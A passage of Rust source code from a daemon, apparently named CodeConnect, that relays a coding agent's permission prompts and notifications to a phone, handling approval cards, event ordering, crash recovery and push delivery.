                            generation: row.generation,
                            // Deliberately not carried across the restart: it
                            // described a screen this process never saw.
                            prompt: None,
                        },
                    );
                    restored += 1;
                }
                crate::log_info!(
                    "recovery: {restored} approval card(s) restored; each is re-checked against \
                     the pane before it can be answered"
                );
            }
            Ok(_) => {}
            Err(err) => crate::log_error!("recovery: could not read pending approvals: {err:#}"),
        }
    }

    /// Record a claimed-but-unsettled answer as a terminal unknown.
    async fn settle_indeterminate(&self, claim: &AnswerClaim) {
        let session = SessionKey::new(&claim.session_uid, &claim.session_id);
        let decision =
            serde_json::from_str::<AnswerDecision>(&claim.decision).unwrap_or(AnswerDecision::Deny);
        let outcome = AnswerOutcome {
            request_id: claim.request_id.clone(),
            session_id: session.name.clone(),
            decision,
            resolved_by: ResolvedBy::Phone,
            applied_via: AnswerPath::SendKeys,
            resolved_at: protocol::time::now_rfc3339(),
            detail: Some(format!(
                "the daemon stopped between typing this answer and recording it (claimed at {}); \
                 whether it reached the agent was never observed, and it will not be typed again",
                claim.started_at
            )),
            inferred: false,
            indeterminate: true,
        };
        if let Err(err) = self
            .db
            .record_answer(
                claim.session_uid.clone(),
                claim.request_id.clone(),
                claim.payload_hash.clone(),
                outcome.clone(),
            )
            .await
        {
            crate::log_error!(
                "recovery: could not record the indeterminate outcome for {}: {err:#}",
                claim.request_id
            );
            return;
        }
        let _ = self
            .store
            .delete_pending_approval(&claim.session_uid, &claim.request_id);
        let pending = PendingEvent::new(
            &session,
            EventKind::ApprovalResolved,
            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
            Source::Daemon,
        )
        .with_source_event_id(format!("resolved:{}", claim.request_id));
        if let Err(err) = self.ingest(pending).await {
            crate::log_error!("recovery: could not record the resolution event: {err:#}");
        }
    }

    /// The daemon's own account of itself, for `codeconnect daemon status` and for
    /// `codeconnect daemon install` deciding whether it is about to fight a process
    /// somebody started by hand.
    pub async fn info(&self) -> protocol::ipc::DaemonInfo {
        protocol::ipc::DaemonInfo {
            pid: std::process::id(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            protocol_version: protocol::PROTOCOL_VERSION,
            protocol_minor: protocol::PROTOCOL_MINOR,
            started_at: self.started_at.clone(),
            launchd_label: self.launchd_label.clone(),
            endpoint_host: self.endpoint.host.clone(),
            endpoint_port: self.endpoint.port,
            tls: self.endpoint.tls,
            bind_ip: self.bind_ip.get().cloned(),
            exe_path: self.exe_identity.get().map(|(path, _)| path.clone()),
            exe_sha: self.exe_identity.get().map(|(_, sha)| sha.clone()),
            build_id: {
                let identity = protocol::build_identity::installed();
                identity
                    .short
                    .is_some()
                    .then(protocol::build_identity::build_tag)
            },
            sessions: self.inner.lock().await.supervisors.len(),
        }
    }

    // ---------------------------------------------------------------- ingest

    /// The gate that makes assignment order and publication order the same.
    ///
    /// One `tokio::sync::Mutex` per run, dropped once nothing else holds it so a
    /// long-lived daemon does not accumulate one per session it ever saw.
    async fn publish_gate(&self, session_uid: &str) -> Arc<Mutex<()>> {
        let mut gates = self.publish_gates.lock().await;
        gates.retain(|_, gate| Arc::strong_count(gate) > 1);
        Arc::clone(gates.entry(session_uid.to_string()).or_default())
    }

    /// Persist a fact and fan it out. Returns `None` if it was a duplicate.
    pub async fn ingest(&self, pending: PendingEvent) -> Result<Option<Event>> {
        let mut pending = pending;
        self.truncate_payload(&mut pending);
        let session_uid = pending.session_uid.clone();

        let gate = self.publish_gate(&session_uid).await;
        let event = {
            let _ordered = gate.lock().await;
            let event = self.db.append_event(pending.clone()).await?;
            if let Some(event) = &event {
                // Published inside the gate, so no later seq can overtake this
                // one on the way to a socket. A send error only means nobody is
                // subscribed; the log already has it.
                let _ = self.events_tx.send(event.clone());
            }
            event
        };

        if let Some(event) = &event {
            let mut inner = self.inner.lock().await;
            inner
                .last_seen_ms
                .insert(session_uid, protocol::time::now_unix_ms());
            note_tool_result(&mut inner, event);
        }
        Ok(event)
    }

    /// Persist a transcript batch **and** its cursor in one transaction, then
    /// publish what committed.
    ///
    /// The only batch ingest there is, and it always carries a cursor. A batch
    /// path without one would be a second way to consume transcript lines, and
    /// the invariant here is that consuming lines and recording that they were
    /// consumed cannot be two separate writes: a crash between them skips those
    /// lines permanently, because the cursor already claims they are done.
    pub async fn ingest_scan(
        &self,
        session_uid: &str,
        pendings: Vec<PendingEvent>,
        cursor: crate::store::TailCursor,
    ) -> Result<usize> {
        let mut pendings = pendings;
        for pending in &mut pendings {
            self.truncate_payload(pending);
        }

        let gate = self.publish_gate(session_uid).await;
        let events = {
            // The gate is a `tokio::sync::Mutex` and is held *across* the
            // commit's await, which is what keeps "the order events were
            // assigned" and "the order they were published" the same sentence
            // now that the commit happens on a blocking thread. Moving the work
            // off the runtime does not move the ordering.
            let _ordered = gate.lock().await;
            let events = self
                .db
                .append_batch_with_cursor(session_uid.to_string(), pendings, cursor)
                .await?;
            // Published only after the commit, and only inside the gate: a
            // subscriber can never be shown a fact the log would lose on the
            // next `kill -9`, nor one that arrives before its predecessor.
            for event in &events {
                let _ = self.events_tx.send(event.clone());
            }
            events
        };

        if !events.is_empty() {
            self.inner
                .lock()
                .await
                .last_seen_ms
                .insert(session_uid.to_string(), protocol::time::now_unix_ms());
        }
        Ok(events.len())
    }

    /// Cap a single payload so one enormous tool response cannot bloat the log
    /// or blow past a WebSocket frame limit. The fact survives; only the bulk is
    /// dropped, and the truncation is recorded rather than hidden.
    ///
    /// The cut lands on a character boundary. `String::truncate` **panics** on
    /// any other byte, and a tool response is exactly the kind of payload that
    /// carries multi-byte text — a path with an accent, a diff with an emoji —
    /// so the naive cut was a panic waiting for the right file name.
    fn truncate_payload(&self, pending: &mut PendingEvent) {
        let encoded = pending.payload.to_string();
        // Measured before the cut, not after: the whole point of recording it is
        // to say how much was dropped, and the truncated length says nothing.
        let original_bytes = encoded.len();
        if original_bytes <= self.config.max_payload_bytes {
            return;
        }
        let mut end = self.config.max_payload_bytes;
        while end > 0 && !encoded.is_char_boundary(end) {
            end -= 1;
        }
        pending.payload = serde_json::json!({
            "_codeconnect_truncated": true,
            "_original_bytes": original_bytes,
            "_preview": &encoded[..end],
        });
    }

    /// The hook path. Returns what cc-hook should print.
    pub async fn handle_hook(self: &Arc<Self>, post: HookPost) -> HookDecision {
        match self.handle_hook_inner(post).await {
            Ok(decision) => decision,
            Err(err) => {
                crate::log_error!("hook ingest failed: {err:#}");
                // Our failure must never look like a denial.
                HookDecision::passthrough()
            }
        }
    }

    async fn handle_hook_inner(self: &Arc<Self>, post: HookPost) -> Result<HookDecision> {
        let input: HookInput = serde_json::from_value(post.payload.clone()).unwrap_or_default();
        let event_name = HookEventName::parse(&post.event);

        let Some(session) = self
            .ensure_session(&post.session_id, post.session_uid.as_deref(), &input)
            .await?
        else {
            // Deleted while the hook was in flight; there is nothing to file it
            // under and nothing to decide. Claude proceeds as if unobserved.
            return Ok(HookDecision::passthrough());
        };

        match &event_name {
            HookEventName::PreToolUse => {
                // A tool is about to run: the run demonstrably moved, so a
                // later quiet state is a new fact the doorbell may announce.
                self.push_gate.note_progress(&session.uid);
                if let (Some(tool_use_id), Some(key)) = (
                    input.tool_use_id.clone(),
                    correlation_key(&session.uid, &input),
                ) {
                    let mut inner = self.inner.lock().await;
                    // Bounded: a long session would otherwise accumulate one
                    // entry per tool call for the whole run.
                    if inner.tool_use_ids.len() > 512 {
                        inner.tool_use_ids.clear();
                    }
                    inner.tool_use_ids.insert(key, tool_use_id);
                }
                self.ingest(hook_event(&session, &event_name, &post.payload, &input))
                    .await?;
            }
            HookEventName::PermissionRequest => {
                return self
                    .handle_permission_request(&session, &post, &input)
                    .await;
            }
            HookEventName::Notification => {
                let filed = self
                    .ingest(
                        self.notification_event(&session, &post.payload, &input)
                            .await,
                    )
                    .await?;
                // Pushed only if the fact was actually filed. `None` here means
                // the session was deleted between `ensure_session` and this
                // write — a notification for a run the user just removed must
                // not ring their phone and open onto nothing.
                if let Some(event) = filed.as_ref() {
                    self.maybe_push(&session, &input, event).await;
                }
            }
            _ => {
                // A finished turn is progress too — the next wait is news.
                if matches!(event_name, HookEventName::Stop) {
                    self.push_gate.note_progress(&session.uid);
                }
                self.ingest(hook_event(&session, &event_name, &post.payload, &input))
                    .await?;
            }
        }

        if post.wait {
            // A gate event we do not specifically handle still must not hang.
            return Ok(HookDecision::passthrough());
        }
        Ok(HookDecision::passthrough())
    }

    async fn handle_permission_request(
        self: &Arc<Self>,
        session: &SessionKey,
        post: &HookPost,
        input: &HookInput,
    ) -> Result<HookDecision> {
        let tool_name = input.tool_name.clone().unwrap_or_else(|| "unknown".into());
        let tool_input = input.tool_input.clone().unwrap_or(serde_json::Value::Null);
        let display_text = approval_payload_text(&tool_name, &tool_input);
        let payload_hash = approval_payload_hash(&tool_name, &tool_input);

        let request_id = {
            let inner = self.inner.lock().await;
            correlation_key(&session.uid, input)
                .and_then(|key| inner.tool_use_ids.get(&key).cloned())
        };

        // Fall back to a deterministic id derived from the exact request, so a
        // build that never emits `tool_use_id` still gets stable idempotency.
        let request_id = request_id.unwrap_or_else(|| {
            format!(
                "pr-{}-{}",
                input.prompt_id.as_deref().unwrap_or("noprompt"),
                &payload_hash[..16]
            )
        });

        // Computed here rather than on the phone: the classification must be
        // identical for every client, and a phone parsing shell syntax to
        // decide how alarming to look is a second implementation to keep in
        // step. It is a rendering hint, never a gate.
        let risk = protocol::risk::classify(&tool_name, &tool_input);

        let card = ApprovalCard {
            request_id: request_id.clone(),
            payload_hash: payload_hash.clone(),
            tool_name,
            tool_input,
            display_text,
            permission_suggestions: input.permission_suggestions.clone(),
            prompt_id: input.prompt_id.clone(),
            permission_mode: input.permission_mode.clone(),
            risk: Some(risk.clone()),
            // The prompt this card belongs to. Derived from the log rather than
            // from a counter, so a replayed hook cannot advance it and a restart
            // cannot lose it.
            generation: self
                .db
                .count_events_of_kind(session.uid.clone(), EventKind::ApprovalRequest)
                .await?
                + 1,
            // Not yet: the prompt is not on screen when this hook fires. Bound a
            // few hundred milliseconds later, and announced when it is.
            identity_bound: false,
        };
        let generation = card.generation;

        let payload = serde_json::json!({ "card": card, "hook": post.payload });
        let pending = PendingEvent::new(session, EventKind::ApprovalRequest, payload, Source::Hook)
            .with_source_event_id(format!("perm:{request_id}"));

        // A duplicate is a *replay*, not a re-ask. Ignoring this result and
        // inserting anyway meant a hook redelivered after the card had already
        // been answered put a phantom block back on the session — one nothing
        // would ever resolve, because its answer was already in the ledger.
        //
        // Nothing above this line mutated any state, so a replay leaves through
        // here having changed exactly nothing: no card, no generation, no
        // superseded neighbours.
        let Some(approval_event) = self.ingest(pending).await? else {
            crate::log_debug!(
                "duplicate PermissionRequest for {request_id} in {}; state left alone",
                session.name
            );
            return Ok(HookDecision::ask(
                "CodeConnect: mirrored to your phone; answer here or there",
            ));
        };

        let hold = Duration::from_millis(self.config.hold_ms);
        let (responder_tx, responder_rx) = if hold.is_zero() {
            (None, None)
        } else {
            let (tx, rx) = oneshot::channel::<HookDecision>();
            (Some(tx), Some(rx))
        };

        // A new structured request means the previous prompt is gone: Claude
        // asks one thing at a time, so whatever was on screen has been answered
        // or withdrawn. Recording the new generation is what makes an older card
        // un-answerable; superseding is what stops it sitting on the phone
        // pretending it can still be tapped.
        self.inner
            .lock()
            .await
            .prompt_generation
            .insert(session.uid.clone(), generation);
        self.supersede_older_cards(session, generation, &request_id)
            .await;

        let created_ms = protocol::time::now_unix_ms();
        let label = self.effective_project_label(&session.uid).await;
        {
            let mut inner = self.inner.lock().await;
            inner.pending.insert(
                (session.uid.clone(), request_id.clone()),
                PendingApproval {
                    card: card.clone(),
                    session: session.clone(),
                    project_label: label.clone(),
                    created_ms,
                    responder: responder_tx,
                    claimed: false,
                    local_misses: 0,
                    tool_ran: false,
                    generation,
                    prompt: None,
                },
            );
        }
        if !self
            .persist_pending(session, &card, generation, created_ms)
            .await
        {
            // The session was deleted between this hook arriving and the card
            // being filed. The row, its events and its tombstone all exist;
            // keeping the in-memory approval would leave the daemon holding
            // live state for a run nobody can see. Retire it and answer the
            // hook locally.
            let mut inner = self.inner.lock().await;
            inner
                .pending
                .remove(&(session.uid.clone(), request_id.clone()));
            drop(inner);
            crate::log_info!(
                "dropping approval {} for {}: the session was deleted while it was in flight",
                request_id,
                session.name
            );
            return Ok(HookDecision::ask(
                "CodeConnect: this session was removed from the fleet; answer at the keyboard",
            ));
        }

        // The prompt is not on screen yet — the hook runs microseconds before
        // Claude draws it — so identity is established just behind it, off the
        // hook's critical path.
        self.spawn_prompt_binding(session.clone(), request_id.clone(), generation);

        // One ring per decision. Keyed by the prompt, which the
        // `permission_prompt` notification that follows this hook shares — so
        // the twin finds the key and stays silent, and a *replayed* request
        // (dedup above) never gets this far. Devices that receive the card on
        // a live socket are excluded at dispatch.
        let prompt_key = input
            .prompt_id
            .clone()
            .unwrap_or_else(|| request_id.clone());
        // **A decision supersedes a notice about it.** A `permission_prompt`
        // can arrive first and ring as "waiting for your input"; when the card
        // itself lands moments later, that earlier ring is describing the same
        // moment in weaker words. Recording the run's progress kills it inside
        // its dispatch grace, so one notification goes out — the actionable
        // one. Without that, both survive, and APNs stores exactly one per
        // device without saying which, so the reader could be left holding the
        // wrong one.
        if let Some(ticket) = self.push_gate.admit_decision(&session.uid, &prompt_key) {
            self.dispatch_push(
                session.uid.clone(),
                approval_event.seq,
                PushHint {
                    // The project, not the run's tmux name: `cc-1` is the
                    // lowest free counter and the next run inherits it, so it
                    // named nothing a reader could recognise.
                    project_label: label.clone(),
                    // **No tool name and no risk class.** The tool says what
                    // an agent is doing to anyone who can read the payload, and the class is a judgement the
                    // card itself states — with the matched pattern beside it,
                    // which a lock screen has no room for and Apple has no
                    // business holding.
                    kind: crate::apns::PushKind::Approval,
                    // See `describing`: the count belongs to the moment of
                    // ringing, not the moment of admission.
                    blocked_sessions: 0,
                    session_uid: session.uid.clone(),
                },
                ticket,
                // A pending decision outlives other tools' progress; only the
                // session's death, or the card being answered, cancels it.
                false,
                Some(CardKey::Request(request_id.clone())),
            );
        }

        // hold_ms == 0 by default: in mirror mode the *local* prompt is what the
        // phone's answer is typed into, so delaying it would delay the answer.
        // On claude 2.1.220 this `ask` renders nothing for PermissionRequest —
        // it is the semantically correct answer, and it costs nothing.
        let Some(rx) = responder_rx else {
            return Ok(HookDecision::ask(
                "CodeConnect: mirrored to your phone; answer here or there",
            ));
        };
        match tokio::time::timeout(hold, rx).await {
            Ok(Ok(decision)) => Ok(decision),
            _ => Ok(HookDecision::ask(
                "CodeConnect: held for you but no answer arrived, deferring to local operator",
            )),
        }
    }

    // ------------------------------------------------------- prompt identity

    /// Retire every card in this run that an arriving prompt has replaced.
    ///
    /// Claude asks one thing at a time, so a new structured request means the
    /// previous prompt is off the screen. Leaving its card open would leave a
    /// tappable button on the phone for a question nobody can answer any more —
    /// and, before generations existed, tapping it typed into whatever prompt
    /// had taken its place.
    ///
    /// A *claimed* card is left alone: an injection is already in flight for it
    /// and its own path owns the outcome.
    async fn supersede_older_cards(
        &self,
        session: &SessionKey,
        generation: u64,
        keep: &str,
    ) -> usize {
        let stale: Vec<String> = {
            let inner = self.inner.lock().await;
            inner
                .pending
                .iter()
                .filter(|((uid, request_id), entry)| {
                    uid == &session.uid
                        && request_id != keep
                        && entry.generation < generation
                        && !entry.claimed
                })
                .map(|((_, request_id), _)| request_id.clone())
                .collect()
        };
        for request_id in &stale {
            self.resolve_without_phone(
                request_id,
                session,
                AnswerDecision::Deny,
                ResolvedBy::Superseded,
                "a newer prompt replaced this one before it was answered; nothing was typed",
                true,
            )
            .await;
        }
        stale.len()
    }

    /// Persist the card so a restart still knows the agent is waiting.
    ///
    /// Best-effort by design: failing to write the projection must not stop the
    /// card reaching the phone, because the durable *fact* is already in the
    /// event log and the projection is only there to save rebuilding it.
    /// False when the write was refused because the session no longer exists —
    /// deleted while the hook was in flight. The caller must retire the
    /// in-memory entry it just made, or the daemon holds an approval for a run
    /// with no row until the expiry sweep finds it.
    async fn persist_pending(
        &self,
        session: &SessionKey,
        card: &ApprovalCard,
        generation: u64,
        created_ms: i64,
    ) -> bool {
        let Ok(encoded) = serde_json::to_string(card) else {
            crate::log_error!("could not encode the card for {}", card.request_id);
            return true;
        };
        match self
            .db
            .upsert_pending_approval(PendingApprovalRow {
                session_uid: session.uid.clone(),
                session_id: session.name.clone(),
                request_id: card.request_id.clone(),
                card: encoded,
                generation,
                created_ms,
            })
            .await
        {
            Ok(written) => written,
            Err(err) => {
                crate::log_error!(
                    "could not persist the pending card for {}: {err:#}",
                    card.request_id
                );
                // An I/O failure is not evidence the session is gone; the
                // in-memory half stays and recovery is the expiry sweep's job,
                // exactly as before this returned anything.
                true
            }
        }
    }

    /// Watch for the prompt this card was raised for, and record what it looks
    /// like.
    ///
    /// Off the hook's critical path on purpose: the hook has already returned,
    /// and making Claude wait ~600ms for us to look at the screen would delay
    /// the very prompt we are trying to photograph.
    fn spawn_prompt_binding(
        self: &Arc<Self>,
        session: SessionKey,
        request_id: String,
        generation: u64,
    ) {
        let daemon = Arc::clone(self);
        tokio::spawn(async move {
            for _ in 0..PROMPT_SETTLE_ATTEMPTS {
                tokio::time::sleep(PROMPT_SETTLE_INTERVAL).await;
                // Gone already — answered at the keyboard, or superseded.
                let still_open = {
                    let inner = daemon.inner.lock().await;
                    inner
                        .pending
                        .get(&(session.uid.clone(), request_id.clone()))
                        .is_some_and(|entry| entry.prompt.is_none())
                };
                if !still_open {
                    return;
                }
                let Ok(pane) = daemon.capture_visible(&session.uid).await else {
                    continue;
                };
                if daemon
                    .bind_prompt_identity(&session, &request_id, generation, &pane)
                    .await
                {
                    return;
                }
            }
            crate::log_debug!(
                "no permission prompt became visible for {request_id} in {}; the card stays \
                 answerable only at the keyboard",
                session.name
            );
        });
    }

    /// Fingerprint the prompt on `pane` and bind it to this card. Returns true
    /// when identity was established.
    async fn bind_prompt_identity(
        &self,
        session: &SessionKey,
        request_id: &str,
        generation: u64,
        pane: &str,
    ) -> bool {
        let presence = self.with_needle_overrides(PromptPresence::PermissionPrompt);
        let Some(needle) = presence.find_match(pane, None) else {
            return false;
        };
        let Some(fingerprint) = protocol::ipc::prompt_fingerprint(pane, &needle) else {
            return false;
        };

        let mut inner = self.inner.lock().await;
        let id: ApprovalId = (session.uid.clone(), request_id.to_string());
        let Some(entry) = inner.pending.get_mut(&id) else {
            return false;
        };
        // A prompt that appeared after a *newer* request is not this card's.
        if entry.generation != generation || entry.prompt.is_some() {
            return false;
        }
        entry.prompt = Some(fingerprint);
        entry.card.identity_bound = true;
        let card = entry.card.clone();
        let created_ms = entry.created_ms;
        drop(inner);

        // Re-persisted so a restart recovers a card that says what it is.
        self.persist_pending(session, &card, generation, created_ms)
            .await;

        // Announced as its own fact. The `approval_request` event was written
        // before the prompt existed, so its `identity_bound: false` was true
        // then and is not an answer to "can this be answered from the phone
        // now". An unknown kind round-trips through an older client untouched,
        // which is what makes saying it additive.
        let bound = PendingEvent::new(
            session,
            EventKind::Other("approval_prompt_bound".into()),
            serde_json::json!({
                "request_id": request_id,
                "generation": generation,
                "identity_bound": true,
            }),
            Source::Daemon,
        )
        .with_source_event_id(format!("bound:{request_id}"));
        if let Err(err) = self.ingest(bound).await {
            crate::log_error!("could not record the prompt binding for {request_id}: {err:#}");
        }
        crate::log_debug!(
            "bound {request_id} to the prompt on screen in {}",
            session.name
        );
        true
    }

    async fn notification_event(
        &self,
        session: &SessionKey,
        raw: &serde_json::Value,
        input: &HookInput,
    ) -> PendingEvent {
        let mut payload = raw.clone();
        // Snapshot the pane exactly when Claude says a prompt is up, so the
        // phone can render the real options. A snapshot, never a parse.
        if input.notification_type.as_deref() == Some("permission_prompt") {
            if let Ok(SupervisorResult::Snapshot { text }) = self
                .supervisor_request(
                    &session.uid,
                    SupervisorRequest::Capture {
                        lines: 60,
                        // Scrollback kept: this snapshot is for the phone to
                        // *render*, and context is what makes it readable.
                        // Nothing decides anything from it.
                        visible_only: false,
                    },
                )
                .await
            {
                if let Some(map) = payload.as_object_mut() {
                    map.insert("_codeconnect_pane".into(), serde_json::Value::String(text));
                }
            }
        }
        PendingEvent::new(session, EventKind::Notification, payload, Source::Hook)
    }

    /// Ring the phones that have not seen `trigger_seq`, after a short grace.
    ///
    /// The grace closes a real race: `ingest` broadcasts the event, the socket
    /// tasks write it and record delivery — and this push races those writes.
    /// Dispatching immediately would ring a phone that is milliseconds from
    /// receiving the fact on its live socket. The exclusion list is computed
    /// *after* the pause, at send time, from what was actually written.
    ///
    /// The grace also opens a window the world can move through, so the push
    /// carries the `ticket` its admission minted and re-validates it on
    /// waking — atomically with the exclusion snapshot, so a deletion or
    /// prune is seen whole or not at all, and (for quiet-state pushes,
    /// `heed_progress`) a tool starting after admission means the announced
    /// wait is over and the push dies.
    ///
    /// **Best-effort exactly-once, explicitly.** A socket write that
    /// completes in the sliver after the exclusion snapshot can produce one
    /// duplicate doorbell if the user backgrounds the app at that same
    /// instant; while it stays foregrounded the app declines to present the
    /// banner. Closing the sliver itself needs client delivery
    /// acknowledgements — a protocol change deliberately not taken for a
    /// doorbell whose whole content is four words and a count.
    fn dispatch_push(
        &self,
        session_uid: String,
        trigger_seq: u64,
        hint: PushHint,
        ticket: crate::push_gate::Ticket,
        heed_progress: bool,
        needs_card: Option<CardKey>,
    ) {
        const GRACE: Duration = Duration::from_millis(400);
        let gate = Arc::clone(&self.push_gate);
        let sender = Arc::clone(&self.push);
        let inner = Arc::clone(&self.inner);
        let db = self.db.clone();
        tokio::spawn(async move {
            tokio::time::sleep(GRACE).await;
            // **The run still has to exist.** The ticket catches a session
            // evicted *after* this push was admitted, but not one evicted
            // just before: a hook already past `ensure_session` goes on to
            // admit, and mints its ticket against the epoch the eviction had
            // already bumped. Asked here, the question has one answer for
            // both — a doorbell for a run nobody can open is never rung.
            //
            // A database that will not answer is not an answer: the push goes
            // out, because staying silent about a real decision is the worse
            // of the two mistakes.
            match db.get_session(session_uid.clone()).await {
                Ok(None) => {
                    crate::log_debug!(
                        "push for {} dropped: the run was removed before the doorbell rang",
                        session_uid
                    );
                    return;
                }
                Err(err) => crate::log_warn!(
                    "push for {session_uid}: could not confirm the run still exists: {err:#}"
                ),
                Ok(Some(_)) => {}
            }
            let Some(excluded) =
                gate.exclusions_if_valid(&session_uid, ticket, heed_progress, trigger_seq)
            else {
                crate::log_debug!(
                    "push for {} dropped: superseded during its dispatch grace",
                    session_uid
                );
                return;
            };
            let blocked: Vec<(String, String)> = {
                let held = inner.lock().await;
                if let Some(key) = needs_card {
                    if !card_is_open(&held, &session_uid, &key) {
                        crate::log_debug!(
                            "push for {} dropped: its card was answered before the doorbell rang",
                            session_uid
                        );
                        return;
                    }
                }
                blocked_runs(&held)
            };
            // The subject's name comes out of the same snapshot as the count —
            // see `PushHint::describing` and `PendingApproval::project_label`.
            let named = match blocked.as_slice() {
                [(_, label)] => Some(label.clone()),
                _ => None,
            };
            sender.send(&hint.describing(blocked.len(), named), &excluded);
        });
    }

    async fn maybe_push(&self, session: &SessionKey, input: &HookInput, trigger: &Event) {
        let kind = input.notification_type.as_deref().unwrap_or("");
        // Two gates before any ring — see `crate::push_gate`. The ambient
        // classes collapse Claude's repeating "still waiting" hooks into one
        // ring per state change; `permission_prompt` is the notification twin
        // of a `PermissionRequest` that already rang, keyed by the prompt it
        // shares with it.
        // **Admission and copy in one match.** An unadmitted kind never reaches
        // a sentence, so a `_ =>` arm on the copy side would be a body no
        // notification could ever carry — a fifth string that reads like a
        // supported case and is not one.
        let admitted = match kind {
            "agent_needs_input" => self
                .push_gate
                .admit_ambient(&session.uid, crate::push_gate::Ambient::Waiting)
                .map(|t| (t, crate::apns::PushKind::NeedsInput)),
            "idle_prompt" => self
                .push_gate
                .admit_ambient(&session.uid, crate::push_gate::Ambient::Waiting)
                .map(|t| (t, crate::apns::PushKind::Idle)),
            "agent_completed" => self
                .push_gate
                .admit_ambient(&session.uid, crate::push_gate::Ambient::Done)
                .map(|t| (t, crate::apns::PushKind::Completed)),
            "permission_prompt" => {
                // **Which gate depends on whether there is a card**, and the
                // question and the answer are one operation — see
                // `PushGate::admit_notice`. Read apart, this notice and the
                // `PermissionRequest` for the same prompt can each conclude the
                // other has not happened yet and both ring.
                //
                // Whether a card exists is the daemon's own state, so it is
                // resolved before the gate is entered; the gate is what decides
                // and records, under one guard, in one step.
                let has_card = match input.prompt_id.as_deref() {
                    Some(prompt) => self.has_pending_card(&session.uid, prompt).await,
                    None => false,
                };
                self.push_gate
                    .admit_notice(&session.uid, input.prompt_id.as_deref(), has_card)
                    .map(|(ticket, notice)| {
                        let kind = match notice {
                            crate::push_gate::Notice::Decision => crate::apns::PushKind::Approval,
                            crate::push_gate::Notice::Waiting => crate::apns::PushKind::NeedsInput,
                        };
                        (ticket, kind)
                    })
            }
            _ => None,
        };
        // The ticket is minted inside the admission's own critical section:
        // progress landing anywhere after it — even before the dispatch task
        // spawns — reads as a moved epoch and kills the push.
        let Some((ticket, push_kind)) = admitted else {
            return;
        };
        // **The doorbell carries no agent text.** `input.message` is the
        // agent's own sentence and routinely names files and commands; an APNs
        // payload passes through Apple, and the documented design is that
        // nothing an agent wrote ever does. The body is derived from the hook's
        // *type* alone — the fact that a bell rang, never what it rang about.

        self.dispatch_push(
            session.uid.clone(),
            trigger.seq,
            PushHint {
                // **The cwd the daemon has persisted.** A notification hook may
                // omit `cwd` entirely, and `ensure_session` keeps the last one
                // it was told; reading this hook's field directly would leave a
                // push with no label whenever the hook happened not to carry
                // one.
                project_label: self.effective_project_label(&session.uid).await,
                kind: push_kind,
                // Overwritten at ring time by `describing`, which reads the
                // fleet as it is when the doorbell actually goes.
                blocked_sessions: 0,
                session_uid: session.uid.clone(),
            },
            ticket,
            // **A decision outlives other tools' progress wherever it was
            // admitted**, exactly as it does on the `PermissionRequest` path;
            // only the session's death cancels it. A `permission_prompt` whose
            // card is already filed is admitted here as that same decision, and
            // the `note_progress` the request records moments later would
            // otherwise cancel it — while the request's own admission found the
            // prompt key taken and stayed silent. Two silences, and a reader
            // never told there is a card waiting.
            push_kind != crate::apns::PushKind::Approval,
            // A notice that turned out to be a decision announces a specific
            // card, and has to still mean it when it rings.
            match push_kind {
                crate::apns::PushKind::Approval => input.prompt_id.clone().map(CardKey::Prompt),
                _ => None,
            },
        );
    }

    /// **A card is named by where its run is now.**
    ///
    /// The label is captured with the card so that composing a doorbell needs
    /// no database read — but a run can move, and the fleet redraws from the
    /// row. A card left holding the old name would put one name on a lock
    /// screen and another on the list behind it.
    ///
    /// Called by every writer of a session's `cwd`: an ordinary hook, and a
    /// supervisor registering or reconnecting. One of them relabelling and the
    /// other not is how the two names come apart again.
    async fn relabel_open_cards(&self, session_uid: &str, cwd: &str) {
        let label = crate::project_label::project_label(cwd);
        let mut inner = self.inner.lock().await;
        for pending in inner.pending.values_mut() {
            if pending.session.uid == session_uid && pending.project_label != label {
                pending.project_label = label.clone();
            }
        }
    }

    /// Whether *this prompt* has a card the decision list could show.
    ///
    /// Per prompt, not per session: a run can hold an open card for one prompt
    /// while a notice arrives for a newer one that has no card yet, and
    /// answering "yes, there is a card" for that would send a reader to the
    /// wrong decision.
    async fn has_pending_card(&self, session_uid: &str, prompt_id: &str) -> bool {
        let inner = self.inner.lock().await;
        inner.pending.iter().any(|((uid, _), entry)| {
            uid == session_uid && entry.card.prompt_id.as_deref() == Some(prompt_id)
        })
    }

    /// What the fleet would call this run, from the cwd the daemon has
    /// persisted rather than from whatever the current hook happened to carry.
    async fn effective_project_label(&self, session_uid: &str) -> String {
        match self.db.get_session(session_uid.to_string()).await {
            Ok(Some(row)) => crate::project_label::project_label(&row.cwd),
            // No row: the run is gone. Say nothing rather than reach for the
            // tmux name.
            Ok(None) => String::new(),
            // A database that will not answer is not the same thing as a run
            // with no project, even though the notification says the same
            // words for both — so it is said out loud here.
            Err(err) => {
                crate::log_warn!("push: no project label for {session_uid}: {err:#}");
                String::new()
            }
        }
    }

    /// Work out which run this hook belongs to, adopting it if it is new, and
    /// learn its transcript path / Claude uuid along the way.
    ///
    /// Three cases, in decreasing order of confidence:
    ///
    /// 1. **The hook carries a uid.** `codeconnect claude` minted it at spawn and passed
    ///    it into the generated settings, so this is exact.
    /// 2. **No uid, but a live run answers to the name.** A session started
    ///    before this daemon was upgraded posts from a settings file that
    ///    predates the flag; continuing its existing identity is what keeps the
    ///    in-place upgrade seamless.
    /// 3. **No uid and no live run.** Either a session CodeConnect never
    ///    launched (`claude:<uuid>`) or a name whose previous holder has exited.
    ///    A fresh identity is minted — an exited run must never gain new events,
    ///    which is the whole point.
    ///
    /// `Ok(None)` when the run was deleted while this hook was in flight: the
    /// hook is dropped, and that is the expected outcome rather than an error.
    async fn ensure_session(
        &self,
        session_id: &str,
        session_uid: Option<&str>,
        input: &HookInput,
    ) -> Result<Option<SessionKey>> {
        let now = protocol::time::now_rfc3339();
        let existing = self.lookup_run(session_id, session_uid).await?;
        let uid = match (&existing, session_uid) {
            (Some(row), _) => row.session_uid.clone(),
            (None, Some(uid)) if protocol::uid::is_well_formed(uid) => uid.to_string(),
            (None, _) => {
                // A name the user removed stays removed: an adopted run's hooks
                // carry no uid, so without this check the next hook after a
                // deletion would mint a fresh identity and put the row straight
                // back. A SessionStart is the one exception — a resume
                // announcing itself is a request to observe again, so it clears
                // the record and re-adopts.
                if self.db.name_is_tombstoned(session_id.to_string()).await? {
                    if input.event_name() == HookEventName::SessionStart {
                        self.db.clear_name_tombstone(session_id.to_string()).await?;
                        crate::log_info!(
                            "re-adopting {session_id}: a new session announced itself"
                        );
                    } else {
                        crate::log_info!(
                            "dropping a hook for {session_id}: the run was removed and nothing new has started"
                        );
                        return Ok(None);
                    }
                }
                let uid = protocol::uid::new()?;
